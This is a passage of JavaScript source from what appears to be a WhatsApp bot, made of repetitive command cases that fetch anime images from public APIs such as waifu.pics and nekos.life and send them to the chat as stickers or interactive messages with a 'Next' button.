.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'meow':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'animeawoo':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
 let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animemegumin':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeshinobu':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehandhold':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehighfive':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecringe':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animedance':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehappy':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeglomp':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmug':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeblush':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewave':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmile':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepoke':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewink':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebonk':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebully':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeyeet':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebite':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animelick':{
await hana()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
